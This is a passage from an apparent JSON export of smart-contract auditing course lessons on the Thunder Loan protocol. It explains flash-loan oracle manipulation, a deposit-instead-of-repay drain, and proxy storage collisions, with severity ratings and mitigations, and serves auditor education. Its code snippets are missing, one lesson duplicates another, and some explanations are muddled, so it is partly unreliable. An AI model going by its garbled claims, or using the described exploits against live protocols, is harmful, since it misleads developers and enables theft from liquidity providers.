          "rawMarkdownUrl": "/routes/security/6-thunder-loan/39-exploit-oracle-manipulation-minimized/+page.md",
          "markdownContent": "---\ntitle: Exploit - Oracle Manipulation - Minimized\n---\n\n# Utilizing SC Exploits for Oracle Manipulations in Blockchain Protocols\n\nIn the whirlwind universe of blockchain protocols, there lies a fascinating yet notoriously common class of vulnerabilities that all budding developers should be aware of - Oracle Manipulations. The term \"Oracle\" refers to an entity that helps blockchain protocols interact with the outside world by providing them with real-world data. In this article, we'll delve deep into the world of SC (Smart Contract) exploits, examining a particular vulnerability concerning Oracle manipulations and how it can be leveraged for profit.\n\n![](https://cdn.videotap.com/7l5XeduNYadMolRpvY1p-27.77.png)\n\n## A Basic Understanding of Flash Loans\n\nFirst things first, let's recap an elemental concept - Flash loans. To keep it simple, flash loans are loans that allow you to borrow assets without any collateral, with the condition that you return them within a single transaction.\n\nHere's a basic formula for a flash loan:\n\n1. An entity calls for a flash loan.\n2. They get the loaned asset (say, a particular cryptocurrency).\n3. They carry out an operation or multiple operations using the asset.\n4. Finally, they return the money within the same transaction.\n\n## SC Exploits and Oracle Manipulations - How Does It Happen?\n\nLet's walk through an example of how these exploit works. Consider a common situation where we have a decentralized exchange, TSwap for instance. Within TSwap, you have two liquidity pools, as in all traditional DEXs. Let's say these pools hold 100 USD Coin (USDC) and 10 Wrapped Ether (WETH) respectively.\n\nGiven the current holdings, the ratio of USDC to WETH in this pool is 10:1. This means that you could theoretically get 1 WETH for 10 USDC, ignoring slippage and other factors.\n\nSo, what happens if our savvy exploiter decides to take a flash loan?\n\nLet's say the entity takes out a flash loan of 1,000 USDC. Instead of using this for the usual operations, they decide to swap it onto TSwap, pushing its USDC reserves up to 1,100. This drastically changes the ratio in the pool, making WETH significantly more expensive in terms of USDC.\n\nThe trick here, however, is that all of this is happening within the timeline of a single transaction. To an outside observer (including other smart contracts), it looks like for a brief moment, the price of WETH has soared.\n\n## The Consequences of Price Manipulation\n\nIf another protocol that uses Tswap's price feed to determine the price of certain assets, it would momentarily read this wrong price. Assume a protocol, which we call Protocol 'Whoops', mints NFTs at a rate pegged to the price of WETH. The hacker can temporarily buy these NFTs for cheap, sell them for a profit, and then pay back the flash loan - all in one transaction!\n\nWe can see how exploiting oracle manipulation can be quite a lucrative business - but only for those equipped with in-depth knowledge of blockchain, smart contracts, and DeFi protocols.\n\n## The Thunderloan Example\n\nConsider the Thunderloan contract, which is a perfect representation of such exploits. It uses a TSwap-like decentralized exchange as its price oracle, creating a significant risk as flash loans can manipulate the price feed quite conveniently. Thus, a savvy exploiter could utilize a flash loan from Thunderloan to manipulate Thunderloan itself.\n\nYou can explore further on oracle manipulation exploits by checking out the SC exploits in the \"minimized\" section on Github. It includes a detailed example of Oracle manipulation and how it played out, including everything needed for you to try and test it yourself in a local environment.\n\n## Notable Incidents\n\nOne notable case that stands out in history is the Cream Finance attack that took place in 2021. The attacker exploited a pricing vulnerability by lending and borrowing flash-loaned funds between two addresses, wreaking havoc on Cream's financial assets.\n\nThe Cream Finance attack is not unique; several other significant and minor hacks have been carried out over the years that involve similar exploit methods. Therefore, be it as a developer on the lookout for bugs in your protocols or a crypto enthusiast looking for loopholes, understanding oracle manipulation attacks should be in your toolkit.\n\n## Conclusion\n\nOracle manipulation is an intriguing and unfortunately prevalent attack vector within blockchain protocols. It is crucial as developers, stakeholders, and enthusiasts to understand such vulnerabilities to build, invest, and operate more securely within the crypto space.\n",
          "updates": []
        },
        {
          "lessonId": "6a890d64-3b94-4fba-907a-935065ff8efd",
          "number": 40,
          "title": "Oracle Manipulation: ThunderLoan Poc",
          "slug": "exploit-oracle-manipulation-thunderloan-poc",
          "folderName": "40-exploit-oracle-manipulation-thunderloan-poc",
          "description": "",
          "duration": 29,
          "videoUrl": "a4UbnhGl8ThvI00EdJPma8Jmtj01oQlaB3cJT8HsI302WI",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/40-exploit-oracle-manipulation-thunderloan-poc/+page.md",
          "markdownContent": "---\ntitle: Exploit - Oracle Manipulation - Thunder Loan PoC\n---\n\n# Exploiting Oracles with Flash Loans\n\nOracles play a critical role in blockchain systems by providing external data to smart contracts. However, improperly designed oracles can lead to devastating oracle manipulation attacks. In this post, we will demonstrate an advanced oracle manipulation attack using flash loans.\n\n## Overview\n\n![](https://cdn.videotap.com/kM0YOBTs7t8WreMLhr2A-49.5.png)We recently audited a lending protocol called ThunderLoan that relies on a DEX called TSWAP for price feeds. By exploiting TSWAP with flash loans, we will manipulate prices and extract cheaper flash loans.\n\nThis is an extremely advanced attack that combines:\n\n- Flash loans\n- Oracle manipulation\n- Arbitrage bots\n- DEX price manipulation\n\n## Exploiting the Oracle\n\nTo manipulate the price oracle, we will:\n\n1. Take out a flash loan of 50 **tokenA**\n2. Use the loan to manipulate TSWAP reserves\n3. Take out another flash loan for a hugely reduced fee\n\nWhen `maliciousFlashLoan` is called:\n\n1. The first 50 token loan dumps onto TSWAP, manipulating prices\n2. The second 50 token loan has a massively reduced fee due to the price change\n\n### Full Exploit Code\n\n![](https://cdn.videotap.com/xK2fynd4EnHBvr8emyyD-1501.5.png)\n\nIt's very complex but essentially:\n\n1. Borrows 50 tokens\n2. Swaps them on TSWAP, nuking the price\n3. Borrows another 50 tokens for cheaper\n4. Checks the fee is reduced\n5. Repays everything\n\nRunning the code proves fees are drastically reduced by the attack.\n\n## Impact\n\nThis attack allows attackers to take flash loans for extremely cheap. They circumvent the protocol's fees and essentially get free money.\n\nWe classify this as a medium severity issue. It's unlikely to be exploited in the wild due to complexity, but if it was, it could seriously compromise sustainability.\n\n## Recommended Mitigation\n\nThe root cause is using on-chain DEX reserves to price assets. This is easily manipulated.\n\nInstead, we recommend decentralized oracle solutions like:\n\n- Chainlink Price Feeds\n- Uniswap TWAP\n\nThese are robust against manipulation, ensuring accurate prices even during attacks.\n\nWe hope this post has provided valuable insight into advanced oracle manipulation attacks in blockchain systems. As protocols expand in complexity, deeply understanding these attacks will prove invaluable to engineers and auditors alike.\n",
          "updates": []
        },
        {
          "lessonId": "14bf10cf-959a-4040-862f-e91241459691",
          "number": 41,
          "title": "Oracle Manipulation: Recap",
          "slug": "oracle-manipulation-recap",
          "folderName": "41-oracle-manipulation-recap",
          "description": "",
          "duration": 3,
          "videoUrl": "zfn2qV1R9DLzY01cCx0202A1AmKMgv01JD2CQ6jDjqRu4k4",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/41-oracle-manipulation-recap/+page.md",
          "markdownContent": "---\ntitle: Oracle Manipulation Recap\n---\n\n# Flash Loans: Making Blockchain Arbitrage Accessible\n\nArbitrage, the simultaneous buying and selling of assets in different markets to take advantage of differing prices, has long been an effective strategy for the 'financially fearless' among us. A concept traditionally dominated by the deep-pocketed whales of Wall Street, the decentralised finance (DeFi) world is flipping the field on its head with the application of flash loans.\n\nCan't tell your flash loans from your DeFi? No worries, mate. Let's dive deep into it all and level the arbitrage playing field!\n\n### The Magic of Flash Loans\n\nBut what's a flash loan? A flash loan is a loan that lasts exactly one transaction! Quite an alien concept to anyone versed in traditional finance, this tool is peculiar and unique to the DeFi blockchain realm.\n\n```markdown\n\"It is a loan that lasts exactly one transaction.\"\n```\n\n![](https://cdn.videotap.com/VtEQgP01EvzX42ymoqp1-45.63.png)\n\nWhy so peculiar, you ask? That's because a flash loan smart contract can stipulate 'if you don't pay me back, I will just revert everything that you've done'. Imagine the applications!\n\n### Where the Whales Swim: An Example\n\nThis is where it gets interesting. Major players (whales) deposit large sums of money into protocols that host flash loans. Why? Because every flash loan carries a fee, incentivising whales to keep their money safely in the protocol. But how does this tie into arbitrage, and why should we care?\n\nWell, let's scope out a practical application of flash loans in our arbitrage world.\n\nImagine two different cryptocurrency exchanges present a price discrepancy for the same asset. If you had the funds, you could buy from one exchange at a lower price and sell on the other at a higher price, making a neat profit. This requires substantial initial investment to explore, which is where flash loans change the game completely.\n\nFlash loans democratize the arbitrage domain, allowing even the smallest fish in the sea to swim amongst the whales. By providing the funds for the duration of one transaction, users can perform arbitrages without owning the requisite amount at the outset!\n\n### Flash Loans and DeFi: A New Era of Financial Democracy\n\nIn a regular finance landscape, opportunities for arbitrage are available exclusively to the wealthy class. The DeFi landscape transforms the traditional constructs of finance by opening these virtual doors to anyone and everyone. Flash loans are an empowering tool for the smaller fish to leapfrog the barriers of entry and start swimming in the arbitrage ocean.\n\n```markdown\n\"DeFi levels the playing field and allows anyone to take advantage of these opportunities.\"\n```\n\n### Life in the Flash Lane: From Arbitrage to Collapse\n\nAnother fascinating interaction that can occur between flash loans and DeFi protocols involves â€˜price manipulationâ€™. Here, users leverage flash loans to manipulate the price on a decentralized exchange (DEX), resulting in opportunities for further trading advantages.\n\n![](https://cdn.videotap.com/0dhGroKi4k72ZIMv0UAb-130.37.png)\n\nThis tactic is illustrated in a test we conducted using an imaginary 'Thunder Loans' protocol. We set it up, requested a flash loan, and manipulated the reserve ratios of the DEX, causing a significant change in price. This setup enabled us to borrow another flash loan, this time with a substantially lower fee due to the manipulated rates.\n\nThis might sound somewhat unscrupulous, as the liquidity providers (the whales) lose out, yet the strategy worked. We completed all the necessary moves, hit the 'Thunderloan flash loan' button, manipulated the contract code, ensured the change in reserves, and witnessed the price drop from a 1:1 ratio down to a 1:2 ratio.\n\nFinally, we executed another flash loan, leaving us with a drastically cheaper fee due to our manipulations with the initial flash loan. We then repaid this loan, leading us into an intriguing question: What if we didn't need to repay?\n\n![](https://cdn.videotap.com/CTDan8syFjGyGDy0iJ02-156.44.png)\n\nThis was quite a jog around the DeFi neighborhood and our thrilling exploration of flash loans. Now, take a breather, grab some water or coffee, and letâ€™s gear up for the next leg of this captivating journey in the fantastic world of blockchain technology!\n\nRemember, with DeFi and flash loans, the future of finance is truly in your hands.\n",
          "updates": []
        },
        {
          "lessonId": "ea331fa9-cbc2-4a7c-b208-6ef48440986d",
          "number": 42,
          "title": "Exploit: Deposit Instead Of Repay",
          "slug": "exploit-deposit-instead-of-repay",
          "folderName": "42-exploit-deposit-instead-of-repay",
          "description": "",
          "duration": 17,
          "videoUrl": "xBK8ONKHfUhKR502jyhUSOAcW8psGZD3gmo8a8dTQLj00",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/42-exploit-deposit-instead-of-repay/+page.md",
          "markdownContent": "---\ntitle: Exploit - Deposit Instead of Repay\n---\n\n---\n\n## title: \"Uncovering Unexpected Bugs in Defi Smart Contracts with Thunderlone\"date: \"2021-07-18\"author: \"DeFi Geek\"\n\nWelcome back fellow DeFi enthusiasts! Get ready as we dive into our awesome bug-hunting exercise featuring - Thunderlone and Thunderlone upgraded.\n\nIn this article, I am excited to reveal not just one, but two juicy bugs for you today. One is in the original Thunderlone smart contract, and the other one is lurking in the upgraded version of Thunderlone, which we'll dissect later on.\n\nBear with me as we uncover these bugs and provide strategies to squish them.\n\n## Unearthing Bugs in DeFi Smart Contracts\n\nBefore delving into the bugs, let me remind you - you're doing great. If you're new to DeFi, this section might be a little tough, but hang in there, we're almost at the finish line.\n\n### Bug Hunting Begins!\n\nWith our newfound expertise in flash loans, we've managed to uncover some interesting behaviors and potential oversights.\n\nOur journey began with a simple question: _What other ways exist to get money into this contract, outside of repaying or sending assets directly, that can potentially pull it out later?_\n\nHow did we answer this? For this, we ran a quick scan of Thunderlone's methods.\n\nThis gave us a comprehensive overview of all the methods that Thunderlone has, and their respective function signatures. As we analyzed this information, one function jumped out - _deposit_.\n\n### The \"Deposit\" Function â€“ A New Way to Leverage the System?\n\nUntil now, deposit was mainly used by whales to put their tokens in and redeem them later. But we started wondering, what if the system allowed us to deposit tokens and then redeem them without calling repay?\n\nSounds like a twist in the plot, doesn't it? This interesting loophole sparked our curiosity, leading us to write a proof of code.\n\n### Writing Test to Verify The Bug\n\nOur next step was to create a test scenario. Our test involved initiating a flash loan, after which the user would need to deposit a certain amount.\n\n```markdown\nTest scenario:1. Start loan2. Deposit assets3. Redeem money4. Conclude loan\n```\n\n### Test Results â€“ Validation of the Bug\n\nWhat did we find? We found a loophole â€“ stealing money. You heard right! It turns out that our users can manipulate the system by initiating a flash loan and then merely depositing it. Next, they can redeem all the money, causing a huge loss for our liquidity providers.\n\nCheck it out; the test along with the results of this big reveal is available at `test_number1` on our repository.\n\n## Thunderlone Upgraded - Examination and Exploration\n\nWith Thunderlone dissected, it was time to aim our magnifying lens on Thunderlone Upgraded. Remember, Thunderlone Upgraded was supposed to be the improved version. Did it hold up to expectations? Let's find out.\n\nSince this is an upgradable contract, we had two paths to explore:\n\n1. Starting from scratch - study the code line by line as we did with Thunderlone.\n2. Use **diff** - a command used to spot the differences between two files.\n\nIn this case, we chose the **diff** command as the more efficient approach.\n\nTo see the differences between the two files, we use the diff command:\n\nThanks to **diff**, we got a comprehensive report sifting through lines of codes and comments. This method helped us identify that they planned on swapping the storage spots of `sFlash Loan fee` which would lead to a disastrous storage collision issue!\n\n### Introducing Storage Collision Attack\n\nThis brings us to our second bug - a _storage collision attack_.\n\nTake a moment to imagine a world where a programmer decided to make a quick swap in the storage variables. Initially, you may think it's an innocent programming overlook, right? However, it's an altering decision that will wreak havoc on the entire storage structure, leading to a storage collision attack.\n\nIn short, you can't just swap the storage spots!\n\nIn the original Thunder Loan, `sFlashLoanFee` is present at slot 3, but in the upgraded version, it's present at slot 2. This shift increases the chances of a fatal storage collision. As such, the swap would directly affect the asset owners, hence, leading us down the path of financial discrepancy.\n\n---\n\nAs a final thought, let me just remind you - no matter how minor the change in the code appears, it can have major impacts on your contract's functionality. In this case, this seemingly insignificant storage variable swap has the potential to lead us down a path of storage collision, causing a significant catastrophe.\n\nHappy bug hunting!Stay Safe. Stay Decentralized!\n\nThat's all for now, fellow developers and DeFi enthusiasts. See you in the next venture, decoding, dissecting, and debugging DeFi contracts.\n\nUntil then - keep defying, keep decoding!\n",
          "updates": []
        },
        {
          "lessonId": "4ece65ad-a1e7-405e-9d6c-8f5aaa7f2e45",
          "number": 43,
          "title": "Exploit: Storage Collision",
          "slug": "exploit-storage-collision-storage-refresher",
          "folderName": "43-exploit-storage-collision-storage-refresher",
          "description": "",
          "duration": 3,
          "videoUrl": "EuCI9yCpCAPJ1K200700qQhxOPjVp5t02Ct1HVJp4EoQjw",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/43-exploit-storage-collision-storage-refresher/+page.md",
          "markdownContent": "---\ntitle: Exploit - Storage Collision - Storage Refresher\n---\n\n# Understanding the Mechanism of Ethereum Smart Contract Storage.\n\nThe vast and innovative landscape of Ethereum smart contracts demands a comprehensive understanding of the subtle ways in which these self-executing bits of code work. In this article, we aim to unpack the operational mechanism of smart contract storage, drawing focus on its organization, types of variables, and implications of upgrades. Without further ado, let's dive straight into understanding contract storage.\n\n## Variable Placement in Storage\n\nStorage, in essence, can be understood as a giant array containing variables. Sequential variables get chronologically placed into this array, with each variable occupying a unique storage slot.\n\nFor instance, let's consider a simple variable - `int256 favoriteNumber`. As a first variable, it's placed into `storage slot 0`. If we add another variable, such as a boolean `bool someValue`, it follows suit and gets stacked into `storage slot 1`.\n\n![](https://cdn.videotap.com/fqXHyZ8Wd1AmcWeZV9jE-24.png)\n\n### Variable Packing\n\nWhile this description captures the essence of storage placement, there's an added layer of complexity; Solidity does some interesting stuff like \"packing variables\". However, that's a topic for another day. Rest assured, this bit of information won't interfere with the fundamental understanding of storage.\n\n## Arrays and Mappings in Storage\n\nStorage gets slightly trickier to comprehend when dealing with arrays and mappings. The organization of an array is a tad bit complicated - the length of the array gets positioned in a slot analogous to a regular variable. The actual elements of the array, however, find their home in a hash of the storage slot of the array length.\n\n![](https://cdn.videotap.com/JMGwpAcocpS7uwDvgxPP-45.png)\n\n## The Storage Exceptions: Constants and Function Variables\n\nTwo types of variables are exempted from having storage slots - constants and function variables.\n\n- **Constants**: Constant variables do not warrant storage slots as they are hard-coded directly into the bytecode. Consequently, we don't need to worry about constant variables while delving into storage.\n\n- **Function Variables**: Such variablesâ€”often initialized during the execution of a functionâ€” are temporary and exist only for the duration of the function call. Hence, they are stored in memory space, not in storage slots.\n\n## Storage Slots Upon Contract Upgrade\n\nA key question arises - what happens to the storage slots when a contract is upgraded? Well, the order of variables in our upgraded contract is assigned new storage slots, but it also inherits the previous order of variables.\n\n> \"We've just totally messed up storage by upgrading our contract to some new nonsense.\"\n\nLet's say the boolean variable `someBool` was initially in `storage slot 1`, but upon contract upgrade, the variable shifts to `storage slot 2`. This transition recapsulates the flexibility, albeit complexity, of the Ethereum storage structure.\n\n![](https://cdn.videotap.com/UvEwzYfKpxND8OGan5AW-114.png)\n\nIn conclusion, understanding the storage behavior in Ethereum smart contracts is fundamental for anyone trying to navigate the rich ecosystem. The mappings and order change can surely create some confusion, but with time and practice, managing storage slots becomes second nature.\n",
          "updates": []
        },
        {
          "lessonId": "c0fae74b-3866-49ff-98b8-42cd7c0ae3ce",
          "number": 44,
          "title": "Storage Collision: Diagram",
          "slug": "exploit-storage-collision-diagram",
          "folderName": "44-exploit-storage-collision-diagram",
          "description": "",
          "duration": 2,
          "videoUrl": "dhuoCxUT1dYwkyqoVhWMIdNIg91ZB8Ww5AlZJMAXSgk",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/44-exploit-storage-collision-diagram/+page.md",
          "markdownContent": "---\ntitle: Exploit - Storage Collision - Diagram\n---\n\n# Understanding Ethereum Smart Contract Proxies and Upgrades\n\nIn the exciting world of Ethereum smart contracts, the design pattern of using proxies for contract upgrades provides an effective solution to the otherwise immutable nature of contracts. However, this approach is not devoid of complexities, and amateur developers may often encounter problems with storage slots during contract upgrades. Let's delve into an illustrative example to understand better how this works.\n\n## Fundamentals of Proxy Interaction\n\nTo kick off, let's take a closer look at the basic principles of proxy interaction with smart contracts.\n\nTo put it simply, imagine we have an implementation contract. When a user executes a function, say `setValue(x)`, the call initially goes to the proxy. The proxy is programmed to look at the implementation contract for executing the function. For example, if our contract has an instruction to set its value to `x`, the logic gets sent to the proxy.\n\nOnce inside, the proxy modifies its internal state, storing the new value at a defined storage location. Typically, the first storage slot (slot 0) is used for this purpose.\n\nThis gives us a simplistic view of how the proxy pattern helps align storage with contract implementations.\n\n![](https://cdn.videotap.com/WUQkx9srA6tjA8Yo5lRL-42.36.png)\n\n## The Upgrade Process: What Happens within the Proxy\n\nNow let's see what happens when we decide to upgrade our contract.\n\nIn an upgrade scenario, the proxy points from implementation contract `A` to a new implementation contract `B`. However, the storage inside the proxy remains intact. It will simply start referring to the new contract to carry out its logic.\n\n> Note: The essence of the upgrade process is that the proxy's storage does not get changed or migrated. It just adopts a new source of instruction.\n\n![](https://cdn.videotap.com/gKwLO8tKUQsQFgdhAmZB-72.62.png)\n\n## Potential Issues with Storage Slot Misalignment\n\nThe seamless continuation of storage masks a potential pitfall â€“ storage slot misalignment. If the new implementation isn't mindful of how the storage was structured in the previous implementation, chaos can erupt!\n\nLet's continue our example to see how. Our user calls `setValue(10)` which now points to logic `B`. If `B` has instructions that alter the storage structure like,\n\nIn this situation, `value` gets stored in slot 1 since `initialized` has taken up slot 0. Now, proxy's storage looks completely different with value 5 still in slot 0 and the new value of 10 in slot 1.\n\nStorage slot misalignment might result in overriding storage slots, uninitialized variables, and other issues leading to potential contract vulnerabilities.\n\n![](https://cdn.videotap.com/nvkgWHqUU232F6YtZgQD-111.95.png)\n\n## Diving Deeper with Remix\n\nTo see this in action and further understand, we can use Ethereum's browser-based IDE, [Remix](https://remix.ethereum.org/). In the follow-up post, we'll walk through an immersive hands-on example using Remix to intricately explore the subtleties of contract upgrades and proxy interactions. Stay tuned!\n",
          "updates": []
        },
        {
          "lessonId": "3bc7ad4f-9c3f-441c-921e-a3af7b50f5a9",
          "number": 45,
          "title": "Storage Collision: Remix Examplee",
          "slug": "exploit-storage-collision-remix-examplee",
          "folderName": "45-exploit-storage-collision-remix-examplee",
          "description": "",
          "duration": 4,
          "videoUrl": "Ve7UtIWnU8btUpoL901HBjaaqSN006st9wo4nczp856fg",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/45-exploit-storage-collision-remix-examplee/+page.md",
          "markdownContent": "---\ntitle: Exploit - Storage Collision - Remix Example\n---\n\n# Understanding the Storage Collision in Ethereum Smart Contracts\n\nIn this blog post, we're going to dive deep into understanding one of the common issues Ethereum smart contract developers encounter: the storage collision. In this exploration, we'll utilize Storage Collision, a contract we've sketched in Remix â€” an open-source tool developed by the Ethereum community to help you build smart contracts.\n\n## Introduction to Storage Collision Contract\n\nScroll down in the remix interface and you'll come across the Storage Collision contract. Opening this contract, there are quite a number of lines to dissect. You'll see a special type of contract called `proxy`. Its pivotal role is to call the `set implementation` function.\n\nThere are also helper functions in this contract whose primary task is to read data from the contract. For example, the `readStorage` function checks and fetches the value stored in a specific storage slot.\n\n## Implementation A and B and their peculiarities\n\nThe contract contains two distinct implementations labeled as `implementation A` and `implementation B`, mirroring what was shown in the initial diagram.\n\n- **Implementation A** has `value` located at storage slot zero.\n- **Implementation B** is a bit more complex with `initialized` at storage slot zero. By default, `initialized` should be `false`. But if there's a value in the corresponding slot, `initialized` becomes `true`.\n\n## Deployment and Compilation\n\nNext on the stop, is to compile and deploy these contracts: `Implementation A`, `Implementation B`, and `Storage Collision Proxy`. It's important to note that the `Storage Collision Proxy` is first associated with the contract address for `implementation A`.\n\nNow, we've set our Proxy to point to `implementation A` and we can interact with it accordingly.\n\n## Interacting with Implementation A\n\nTo do this, copy the Proxy address into `implementation A`, allowing us to work directly with `implementation A`.\n\nWhen we check the `value`, it reads '0' because we haven't assigned any value yet. But when we assign 15 to the `value`, the `value` in `implementation A` changes to 15.\n\nIt's worth noting that in solidity, anything aside from 0 is considered `true`. Hence, the `bool public initialize` in `implementation B` is expected to default to `false`. But let's see if that's the case.\n\n## Transition to Implementation B and the Twist\n\nSwitching to `Implementation B`, we change the implementation address in our `Storage Collision Proxy` and then inspect the `value`.\n\nSurprisingly, our `value` reads zero - this is because we have upgraded the contract. However, we can imitate the previous process with `implementation A` and interact with `implementation B`.\n\nWhen we call `initialized`, contrary to the default being `false`, it returns `true`. This happens because within the proxy, the `readStorage()` function is indicating that there's a '15' at storage slot zero.\n\nSince `initialized` is coupled to storage slot zero, the non-zero value makes it return `true`.\n\nThe next process is to set the `value` of `implementation B` to a new number, which affects the `storage slot one`.\n\nThe consequence of this action reveals a **storage collision**.\n\n> In essence, the 'storage collision' is a situation whereby values in the storage slots overlap as a result of an upgrade, causing unexpected changes in the system.\n\n## In Conclusion\n\nIn Ethereum smart contracts, collision issues are something we ought to be wary about. As we've noticed, our upgraded contract seems to be colliding due to these issues, causing unintended changes in the system. Careful architecture of contracts and more thorough analysis are needed to mitigate this risk. As always, understanding the underpinnings of the system and how actions interact with it is key to a successful deployment and operation of your Ethereum smart contracts.\n",
          "updates": []
        },
        {
          "lessonId": "d36939fe-b02e-45d5-9d22-4eba1bf60575",
          "number": 46,
          "title": "Storage Collision: Poc",
          "slug": "exploit-storage-collision-poc",
          "folderName": "46-exploit-storage-collision-poc",
          "description": "",
          "duration": 3,
          "videoUrl": "DjxH2VIkbso7ztm1Mv1AIyUCROCftVZqQfrkBBFR1nI",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/46-exploit-storage-collision-poc/+page.md",
          "markdownContent": "---\ntitle: Exploit - Storage Collision - PoC\n---\n\n# Code Proving 101: An In-Depth Walkthrough in Upgrading Solidity Contracts\n\nWelcome to our walkthrough of writing a proof-of-code for Solidity contracts. Here, we'll be outlining a detailed practice on how you can handle upgrades - an essential part of maintaining and improving smart contracts. The entire process is clear-cut, so don't be shy about getting your hands dirty with code.\n\n### The Test Unit\n\nConveniently, we'll be examining a test unit called Thunderlone, which has an upgrade function we will dissect. Below we will act as the owner of Thunderlone, including deploying a new logic address and making an upgrade proxy call.\n\nAt this point, we fetch the fee before making any changes and state a new `ThunderloneUpgraded`.\n\n![](https://cdn.videotap.com/KgYyc5GgyHgGV9f1xeiW-44.57.png)\n\nIntriguing right? But, not so fast! Weâ€™ve missed something vital. Just before diving to that, we ought to import the upgraded protocol at the top of the test page. Here, `ThunderloneUpgraded.sol` is the Solidity script that defines our `ThunderloneUpgraded` contract.\n\nWith that code added, we now have access to the `ThunderloneUpgraded` contract we instantiated earlier.\n\n### Handling the Upgrade\n\nThe next crucial part involves calling Thunderlone's upgrade function.\n\nFor our purpose, there's no data to call, hence the \"0x\". This function upgrades the proxy to the upgraded address, nifty right?\n\n### Assertions\n\nOnce we log the fees, we come to our final part - asserting that the `feeBeforeUpgrade` indeed changed from `feeAfterUpgrade`.\n\nThis simple test will tell if there is a discrepancy in the fees, which would mean our upgrade tinkered with more than it should have, causing storage collisions.\n\n### Running the Tests\n\nWe are now ready to run this forge test. It's pretty scary how such small changes can end up making mega alterations, right?\n\nKeep crafting your test units as you explore the vast world of Solidity. Don't be too hard on yourself; it takes a few trial and errors before you become a pro! And remember, learning is a never-ending journey. :)\n\nHappy testing!\n",
          "updates": []
        },
        {
          "lessonId": "58af1688-efa6-4821-86af-6adce089437c",
          "number": 47,
          "title": "Reporting: Storage Collision",
          "slug": "exploit-storage-collision-write-up",
          "folderName": "47-exploit-storage-collision-write-up",
          "description": "",
          "duration": 7,
          "videoUrl": "2vM1n1LgRGWdIWrYSTOwO4PJjFQ5yjDMycUmO00noceI",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/47-exploit-storage-collision-write-up/+page.md",
          "markdownContent": "---\ntitle: Exploit - Storage Collision - Write Up\n---\n\n# Debugging and Improving Your Solidity Code with Thunder Loan\n\nIn this blog post, we will take a closer look at how to test, debug and improve your Solidity code, using our Thunder Loan example. Solidity, for those who are less familiar, is a statically typed, contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed to target the Ethereum Virtual Machine.\n\nLet's dive right into it.\n\n## Starting with the Git Checkout and Stashing Changes\n\nFirst, let's pull up our Thunder Loan test. After reviewing the code, it is advisable to stash your changes. Stashing is a great feature of Git that allows you to take a snapshot of your current changes, store them off to the side on a stack of unfinished changes, and then reapply them later.\n\nAfter stashing, I switch the currently active branch to 'demo' using git checkout command.\n\n## Understanding the Impact and Likelihood of Issues\n\nBefore wrapping things up, it is essential to consider the impact and likelihood of the issue in question.\n\nIn our current setting, the impact is high; primarily because the upgrade could potentially lead to what is referred to as a 'storage collision'; a serious problem whereby addresses of storage variables overlap, causing unexpected behaviours. These could inadvertently skew the fees associated with our Thunder Loan.\n\n![](https://cdn.videotap.com/MJYevuA6WF1Wcqj3AgIR-148.52.png)\n\nThe likelihood of this occurring can be medium to low. However, it tends to lean towards a higher likelihood considering that an upgrade was planned.\n\nThe key here is to understand your protocol's likelihood and impact of the storage collision issues, which is a very common pain-point when it comes to proxy contract upgrades.\n\n## Identifying the Root Cause\n\nA root cause analysis reveals that variable location mix-ups can result in storage collisions. In our Thunder Loan case, the problem arises in the _Flash Loan fee_ and the process of _Flash Loaning_. The severity of this problem means that it could potentially paralyze the entire protocol due to the storage location mismatches.\n\nAn example of wrongly mapped variable storage location is as follows:\n\nWhile for the upgraded contract, `thunderloanupgraded.sol`, the storage layout difference is slightly different:\n\nStorage location inconsistencies not only directly impact your protocol's modification, but they can also freeze up the protocol.\n\n## Potential Mitigations and Recommendations\n\nTo mitigate such an issue, it is recommended to maintain constant variables when removing and introducing storage variables.\n\n![](https://cdn.videotap.com/EsivAEC6dyzbBCAvtsGP-267.33.png)\n\nThis recommendation is based on the understanding that storage layouts are very important to the solidity coding structure â€“ modifying them could lead to unexpected errors.\n\nYou can compare the storage layout difference by running the commands:\n\nIf a storage variable must be removed, leave a blank to avoid messing up the storage slots. Here's what it would look like:\n\n## Wrapping Up\n\nIn this post, we have walked through not just the intricacies of debugging and improving solidity code, but also the complexities that proxy contracts introduce. It's no surprise that some developers see proxies as a necessary evil while others view them as progress in the smart contract sphere.\n\nWhether you side with the 'Bad News Bears' or 'Great Progress' team, we strongly encourage you to share your view in our ongoing community discussion!\n\nAs for our next step with Thunder Loan, that will largely consist of doing the reporting. Stay tuned for more updates in that regard. Happy coding until then!\n",
          "updates": []
        },
        {
          "lessonId": "0999f95c-f86e-4739-824d-8565169cfe2f",
          "number": 48,
          "title": "Wrapping Up",
          "slug": "wrapping-up",
          "folderName": "48-wrapping-up",
          "description": "",
          "duration": 2,
          "videoUrl": "un3Q5qFoTpb7xNzlxhxL2019n7iRzPk1tonjNREHf700o",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/48-wrapping-up/+page.md",
          "markdownContent": "---\ntitle: Wrapping Up\n---\n\n# Debugging and Improving Your Solidity Code with Thunder Loan\n\nIn this blog post, we will take a closer look at how to test, debug and improve your Solidity code, using our Thunder Loan example. Solidity, for those who are less familiar, is a statically typed, contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed to target the Ethereum Virtual Machine.\n\nLet's dive right into it.\n\n## Starting with the Git Checkout and Stashing Changes\n\nFirst, let's pull up our Thunder Loan test. After reviewing the code, it is advisable to stash your changes. Stashing is a great feature of Git that allows you to take a snapshot of your current changes, store them off to the side on a stack of unfinished changes, and then reapply them later.\n\nAfter stashing, I switch the currently active branch to 'demo' using git checkout command.\n\n## Updating the Protocol\n\nNext, I paste our Proof of Concept (POC) into the current branch. For this, the Thunder Loan upgraded protocol needs to be imported from the respective source folder.\n\nThe code for this would look like:\n\nAt this point, a test run is required to ensure everything runs smoothly.\n\nThis command runs the test that we just added, confirming its successful implementation.\n\n## Understanding the Impact and Likelihood of Issues\n\nBefore wrapping things up, it is essential to consider the impact and likelihood of the issue in question.\n\nIn our current setting, the impact is high; primarily because the upgrade could potentially lead to what is referred to as a 'storage collision'; a serious problem whereby addresses of storage variables overlap, causing unexpected behaviours. These could inadvertently skew the fees associated with our Thunder Loan.\n\nThe likelihood of this occurring can be medium to low. However, it tends to 